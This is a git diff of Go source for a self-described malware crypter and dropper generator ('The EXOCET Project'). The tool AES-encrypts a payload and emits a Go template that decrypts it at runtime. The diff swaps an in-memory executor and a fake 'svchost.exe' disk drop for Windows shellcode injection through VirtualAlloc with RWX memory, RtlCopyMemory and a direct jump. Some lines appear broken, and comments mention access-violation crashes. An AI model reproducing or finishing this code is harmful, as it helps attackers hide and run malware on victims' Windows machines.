@@ -1,15 +1,15 @@
-package main
+package ExecShellcode
 
 import (
-	"crypto/aes"
-	"crypto/cipher"
-	"crypto/md5"
-	"crypto/rand"
-	"encoding/hex"
-	"fmt"
-	"io"
-	"io/ioutil"
-	"os"
+"crypto/aes"
+"crypto/cipher"
+"crypto/md5"
+"crypto/rand"
+"encoding/hex"
+"fmt"
+"io"
+"io/ioutil"
+"os"
 )
 //https://www.thepolyglotdeveloper.com/2018/02/encrypt-decrypt-data-golang-application-crypto-packages/
 func createHash(key string) string {
@@ -17,8 +17,7 @@ func createHash(key string) string {
 	hasher.Write([]byte(key))
 	return hex.EncodeToString(hasher.Sum(nil))
 }
-// Testing save #2
-// test again
+
 func encrypt(data []byte, passphrase string) []byte {
 	// creates a password hash
 	block, _ := aes.NewCipher([]byte(createHash(passphrase)))
@@ -95,17 +94,29 @@ func writePayload(hexEncryptedMalware []byte, outputMalware string, encryptionPa
 	//var templateGoFile []byte
 	templateGoFile := fmt.Sprintf(`
 package main
-
 import (
+	"unsafe"
+	"syscall"
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/md5"
 	"encoding/hex"
 	"io/ioutil"
 	"fmt"
-	"os/exec"
-	"github.com/amenzhinsky/go-memexec"
+)
 
+const (
+    MEM_COMMIT             = 0x1000
+    MEM_RESERVE            = 0x2000
+    PAGE_EXECUTE_READWRITE = 0x40
+)
+
+var (
+    kernel32      = syscall.MustLoadDLL("kernel32.dll")
+    ntdll         = syscall.MustLoadDLL("ntdll.dll")
+
+    VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
+    RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
 )
 
 func createHash(key string) string {
@@ -149,18 +160,33 @@ func main() {
 		fmt.Printf("#{err}")
 	}
 	decryptedDat := decrypt([]byte(decodedDat), "%s")
-	// First attempt injecting shellcode into running processes
-	// Then attempt in-memory execution
-	exe, err := memexec.New(decryptedDat)
-	if err != nil {
-		fmt.Printf("#{err]")
+	/*Shellcode is correctly decrypted*/
+	// Note: After the decryption process, we need to just add it as a string here, and have this function typecast it into bytes.
+	//var shellcode = []byte(decryptedDat)
+	var shellcode = []byte{decryptedDat}
+/*
+Now we are hitting access violations. exit status 0xc0000005, check for DEP in WinDBG
+*/
+	addr, _, err := VirtualAlloc.Call(
+	0, 
+	uintptr(len(shellcode)), 
+	MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+	
+	if err != nil && err.Error() != "The operation completed successfully." {
+		syscall.Exit(0)
 	}
-	defer exe.Close()
-	cmd := exe.Command()
-	cmd.Output()
-	// Then try to write a file on the disk and execute it
-	ioutil.WriteFile("./svchost.exe", decryptedDat, 0777)
-	exec.Command("svchost.exe")
+	
+	_, _, err = RtlCopyMemory.Call(
+		addr, 
+		(uintptr)(unsafe.Pointer(&shellcode[0])), 
+		uintptr(len(shellcode)))
+	
+	if err != nil && err.Error() != "The operation completed successfully." {
+		syscall.Exit(0)
+	}
+	
+	// jump to shellcode
+	syscall.Syscall(addr, 0, 0, 0, 0)
 }`, hexEncryptedMalware, encryptionPassword)
 	ioutil.WriteFile(outputMalware, []byte(templateGoFile), 0777)
 }
@@ -190,5 +216,5 @@ The EXOCET Project. Part of the Slayer-Ranger's DSX Weapons Program.
 	// Attempt to create a hex encoded payload in another go file, where that other go file serves as a dropper
 	hexEncryptedMalware := encryptMalware(dat, encryptionPassword)
 	writePayload(hexEncryptedMalware, outputMalware, encryptionPassword)
-	fmt.Printf("The malware Go file has been completed. To cross compile the malware dropper for Windows for example, run:\r\n\tenv GOARCH=amd64 GOOS=windows go build %s\n\nThat will return to you a executable\n", outputMalware)
+	fmt.Printf("The encrypted implant has been completed, however you must run golang and gcc on Windows using the Windows toolchain with go build %s\r\nPlease get your toolchain for CGO from https://www.msys2.org/ and add it to your PATH environment variable, sorry for the difficulty", outputMalware)
 }
